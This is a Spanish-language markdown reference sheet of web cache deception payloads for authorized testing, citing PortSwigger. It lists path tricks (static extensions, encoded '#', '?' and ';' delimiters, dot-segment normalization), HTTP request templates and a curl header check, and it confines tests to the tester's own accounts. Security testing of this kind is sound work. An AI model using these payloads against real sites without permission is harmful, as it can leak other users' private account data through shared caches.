# 🗡️ Web Cache Deception: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Extensiones estáticas sobre una ruta privada propia

```text
/account/profile.css
/account/profile.js
/account/profile.png
/account/profile/{NONCE}.css
```

**Cuándo usarlo:** La respuesta debe contener datos de A y luego ser servida desde caché a B; un 200 de SPA no basta.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/web-cache-deception).


### Control de dos sesiones

```text
A: GET /account/profile/{NONCE}.css con su cookie.
B: GET /account/profile/{NONCE}.css con su cookie propia.
Control: GET /account/profile/{OTRO_NONCE}.css con cookie B.
```

**Cuándo usarlo:** También se puede repetir anónimo como control adicional. Verificar Age o cabeceras equivalentes y cuerpo privado de A en B antes de reportar.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/web-cache-deception).


## 🧭 Payloads por contexto

### Delimitadores y caracteres codificados

```text
/account/profile;canary.css
/account/profile%23canary.css
/account/profile%3fcanary.css
/account/profile/canary.css
```

**Cuándo usarlo:** El origen y la caché pueden separar la ruta en puntos diferentes; observar la ruta efectiva.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/web-cache-deception).


## 🔥 Payloads avanzados

### Normalización de segmentos

```text
/static/..%2faccount/profile
/assets/..%2faccount/profile
/images/..%2faccount/profile
```

**Cuándo usarlo:** Solo si la caché guarda el prefijo estático y el origen decodifica %2f y resuelve .. hasta /account/profile. Cada línea cambia únicamente el prefijo; usar perfil propio.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/web-cache-deception).


## 🔬 Pruebas guiadas por escenario

### 1. Extensión estática

**Objetivo:** Comparar respuesta privada y ruta con sufijo estático en cuenta propia.

```http
GET /my-account/{ID_PROPIO}/canary-{NONCE}.css HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_PROPIA}
```

**Interpretación:** Repetir sin cookie desde otra sesión. Solo hay fuga si muestra datos privados de la primera cuenta.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/web-cache-deception).

### 2. Delimitador punto y coma

**Objetivo:** Detectar si origen trunca la ruta y caché conserva sufijo.

```http
GET /my-account;canary-{NONCE}.js HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_PROPIA}
```

**Interpretación:** Comparar cuerpo con `/my-account` y después sin cookie; confirmar HIT en misma URL.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/web-cache-deception).

### 3. Delimitador hash codificado

**Objetivo:** Comprobar decodificación distinta entre capas.

```http
GET /my-account%23canary-{NONCE}.css HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_PROPIA}
```

**Interpretación:** El navegador no envía `#` literal; `%23` sí. Registrar ruta interpretada por origen y caché.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/web-cache-deception).

### 4. Interrogación codificada

**Objetivo:** Buscar regla de archivo estático aplicada antes de decodificar `%3f`.

```http
GET /my-account%3fcanary-{NONCE}.css HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_PROPIA}
```

**Interpretación:** Verificar si el origen trata `?` como delimitador y devuelve perfil mientras caché almacena `.css`.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/web-cache-deception).

### 5. Normalización de dot-segments

**Objetivo:** Comparar path normalizado por caché y original por backend.

```http
GET /my-account;%2f%2e%2e%2fstatic HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_PROPIA}
```

**Interpretación:** Necesita regla de `/static` y delimitador `;` en origen. Confirmar dos interpretaciones, no solo status.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/web-cache-deception).

### 6. Nombre exacto cacheable

**Objetivo:** Comprobar una regla de archivo como `favicon.ico` en ruta propia.

```http
GET /my-account/{ID_PROPIO}/favicon.ico HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_PROPIA}
```

**Interpretación:** Solo impacto si backend devuelve datos privados y segunda sesión los lee desde caché.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/web-cache-deception).

### 7. Control anónimo

**Objetivo:** Descartar que el contenido mostrado sea público.

```http
GET /my-account;canary-{NONCE}.js HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Comparar cuerpo y cabeceras con solicitud autenticada a la misma URL única.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/web-cache-deception).

### 8. Encabezados de caché

**Objetivo:** Inspeccionar política de respuesta privada.

```bash
curl -I "https://{ORIGEN}/my-account" | rg -i "cache-control|age|x-cache|vary"
```

**Interpretación:** HEAD es preliminar; confirmar con GET porque CDN y backend pueden tratarlo distinto.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/web-cache-deception).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
